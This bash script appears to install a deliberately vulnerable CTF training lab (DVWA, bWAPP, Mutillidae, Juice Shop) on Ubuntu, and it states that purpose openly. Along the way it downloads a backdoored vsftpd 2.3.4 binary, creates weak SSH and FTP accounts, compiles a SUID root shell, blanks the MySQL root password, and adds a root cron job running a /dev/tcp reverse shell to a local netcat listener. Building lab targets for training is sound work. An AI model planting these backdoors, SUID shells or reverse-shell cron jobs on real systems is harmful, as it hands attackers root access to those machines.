#!/bin/bash
# VulnLab Ultimate Installer
# For Ubuntu 20.04/22.04 (Root required)
set -e

echo "[+] Updating system & installing dependencies..."
apt update && apt install -y apache2 php php-mysqli mariadb-server git unzip curl vsftpd openssh-server \
  nodejs npm netcat build-essential gcc g++ libcap2-bin

# --- MySQL Config ---
echo "[+] Configuring MySQL..."
service mysql start
mysql -e "ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '';"
mysql -e "FLUSH PRIVILEGES;"
mysql -e "CREATE DATABASE dvwa;"
mysql -e "CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';"
mysql -e "GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';"

# --- Install DVWA ---
echo "[+] Installing DVWA..."
git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
cp /var/www/html/dvwa/config/config.inc.php.dist /var/www/html/dvwa/config/config.inc.php
sed -i "s/'root'/'dvwa'/; s/''/'p@ssw0rd'/" /var/www/html/dvwa/config/config.inc.php

# --- Install bWAPP ---
echo "[+] Installing bWAPP..."
mkdir -p /var/www/html/bwapp
wget https://sourceforge.net/projects/bwapp/files/latest/download -O /tmp/bwapp.zip
unzip /tmp/bwapp.zip -d /var/www/html/bwapp
mv /var/www/html/bwapp/bWAPP/* /var/www/html/bwapp/
mysql -e "CREATE DATABASE bwapp;"
mysql -e "GRANT ALL ON bwapp.* TO 'dvwa'@'localhost';"

# --- Install Mutillidae ---
echo "[+] Installing Mutillidae..."
git clone https://github.com/webpwnized/mutillidae.git /var/www/html/mutillidae

# --- Install Juice Shop ---
echo "[+] Installing Juice Shop..."
mkdir -p /opt/juice-shop
cd /opt/juice-shop
git clone https://github.com/bkimminich/juice-shop.git .
npm install
nohup npm start &

# --- Vulnerable FTP Server ---
echo "[+] Setting up vsftpd backdoored..."
wget https://github.com/andresriancho/vsftpd-2.3.4-backdoor/raw/master/vsftpd-2.3.4 -O /usr/sbin/vsftpd
chmod +x /usr/sbin/vsftpd
cat <<EOF > /etc/vsftpd.conf
listen=YES
anonymous_enable=YES
local_enable=YES
write_enable=YES
xferlog_enable=YES
connect_from_port_20=YES
EOF
useradd -m ftpuser -s /bin/bash
echo "ftpuser:12345" | chpasswd
service vsftpd restart

# --- SSH User with Weak Pass ---
echo "[+] Adding weak SSH user..."
useradd hacker -m -s /bin/bash
echo "hacker:hackme" | chpasswd

# --- SUID Binary ---
echo "[+] Adding custom SUID shell..."
echo -e '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(){setuid(0); system("/bin/bash"); return 0;}' > /tmp/rootshell.c
gcc /tmp/rootshell.c -o /usr/local/bin/rootshell
chmod 4755 /usr/local/bin/rootshell
rm /tmp/rootshell.c

# --- Cronjob Reverse Shell ---
echo "[+] Setting cronjob reverse shell..."
echo "* * * * * root bash -i >& /dev/tcp/127.0.0.1/4444 0>&1" >> /etc/crontab

# --- Flags Setup ---
echo "[+] Creating flags..."
mkdir -p /opt/flags /var/tmp/.hidden
cat <<EOF > /opt/flags/flag1.txt
FLAG{dvwa_root_pwned}
EOF

echo "FLAG{ftp_backdoor_triggered}" > /var/tmp/.hidden/ftp_flag.txt
echo "FLAG{juice_shop_xss}" | base64 > /opt/flags/juice_flag.b64
echo "FLAG{mysql_dump_success}" > /root/mysql_flag.txt
echo "FLAG{reverse_shell_callback}" > /opt/flags/rev_flag.txt

chmod 600 /opt/flags/*.txt /root/mysql_flag.txt
chmod 640 /var/tmp/.hidden/ftp_flag.txt
chown root:root /opt/flags/*.txt /root/mysql_flag.txt
chown ftpuser:ftpuser /var/tmp/.hidden/ftp_flag.txt

# --- Scoreboard Logging Script ---
echo "[+] Creating scoreboard logger..."
mkdir -p /opt/scripts
cat <<'EOF' > /opt/scripts/log_score.sh
#!/bin/bash
echo "$(date) - FLAG found: $1 by user: $(whoami)" >> /var/log/scoreboard.log
EOF
chmod +x /opt/scripts/log_score.sh

# --- Netcat Reverse Shell Listener ---
echo "[+] Starting netcat reverse shell listener on port 4444..."
nohup nc -lvnp 4444 > /opt/reverse_shell.log 2>&1 &

# --- Restart Web Services ---
systemctl restart apache2 mysql

echo "[+] ALL SET!"
echo "Apps:"
echo " - DVWA:        http://<IP>/dvwa"
echo " - bWAPP:       http://<IP>/bwapp"
echo " - Mutillidae:  http://<IP>/mutillidae"
echo " - Juice Shop:  http://<IP>:3000"
echo "Services:"
echo " - SSH:         hacker/hackme"
echo " - FTP:         ftpuser/12345"
echo " - SUID Shell:  /usr/local/bin/rootshell"
echo " - RevShell:    Listens on port 4444"
echo " - Flags:       /opt/flags, /var/tmp/.hidden/, /root"
echo " - Logger:      /opt/scripts/log_score.sh"
